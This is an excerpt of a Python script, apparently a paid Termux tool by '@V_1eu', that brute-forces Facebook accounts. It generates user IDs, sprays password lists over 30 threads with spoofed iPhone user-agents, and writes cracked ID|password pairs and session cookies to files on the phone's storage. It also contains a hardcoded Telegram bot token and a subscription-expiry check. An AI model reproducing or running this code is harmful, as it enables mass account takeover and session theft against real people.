...
g= datetime.datetime(2023,12, 29, 0, 00 ,0)
if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("     "+'انتهى الاشتراك حبيبي تريد تجدد راسلني@V_1eu' )
 print('\n\n')
 print(x)
 sys.exit(0)
if (x.strftime("%x"))==(g.strftime("%x")):
   ...
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("     "+' انتهت الصلاحيه عليك بمراسلت @V_1eu يفعلك  🤍' )
    print('\n\n')
    print(x)
    sys.exit(0)
print('\n \x1b[1;92mWait...')
...
\033[1;37m---------------------------------------
\x1b[\033[1;37mAuthor : @V_1eu
\x1b[\033[1;37mAdmin : AMEER
\x1b[\033[1;37mTelegram : ZOMBI_16 
\x1b[\033[1;37mPASSWORD : 50
\x1b[\033[1;37mPASSWORD WENT : Arabic•Kurdish•foreigner
\x1b[\033[1;37mTOLLS : V4.0 VIP
\033[1;37m---------------------------------------
""")
...
tp=0
id=['6639848643']
tokenku=['6952295543:AAF6eHefW1TYxlsaWIPiXk-ZJu04RGnyyjk']
def login():
        clear()
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/V_1eu.txt \033[0;97m\n')
        #100010138361148
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        print('\x1b[1;91m [01] \x1b[1;92m {VIP}-ﻒﻠﻣ ﺺﺤﻓ')
                        linex()
                        xd=input(' Choose > ')
                        if xd in ['1','01']:
                                ...
                                linex()
                                plist = []
                                print('\x1b[1;91m [01] \x1b[1;92mAuto Passowrd ');linex()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
...
def pak():
                ...
                with tred(max_workers=30) as ASX:     
                        ...
                        print(f'\033[1;32m THE TOOL IS A SPEED TYPE')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def bd():
                ...
                with tred(max_workers=30) as ASX:
                        ...
                        tl = str(len(user))
                        print(' TOTAL IDS. : \033[1;32m'+tl)
                        print(' \033[1;32m THE TOOL IS A SPEED TYPE')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32mV_1eu\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [V_1eu-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/V_1eu-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/V_1eu-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [V_1eu-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/V_1eu-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [V_1eu] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [V_1eu-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/V_1eu-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/V_1euCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [V_1eu-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/V_1eu-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/V_1eu_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [V_1eu-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/V_1eu-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
